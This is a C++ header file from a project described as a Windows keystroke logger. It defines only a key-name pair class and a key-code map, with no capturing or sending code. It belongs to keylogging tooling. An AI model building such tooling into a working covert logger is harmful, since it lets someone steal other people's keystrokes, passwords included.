//
//  KeyLogger: Windows based keystroke logger
//  key_constants.h
//
//  Created by Dulio Denis on 3/5/16.
//  Copyright (c) 2016 Dulio Denis. All rights reserved.
//
//  Compiler: GCC g++

#ifndef KEYCONSTANTS_H
#define KEYCONSTANTS_H

#include <map>
#include <string>

class KeyPair {
    public:
        KeyPair(const std::string &vk = "", const std::string &name=""): VKName(vk), Name(name) {
        }
        std::string VKName; // Virtual Key Name
        std::string Name;   // Actual Key Name

};

class Keys {
    public:
        static std::map<int, KeyPair> KEYS;
};

#endif // KEYCONSTANTS_H
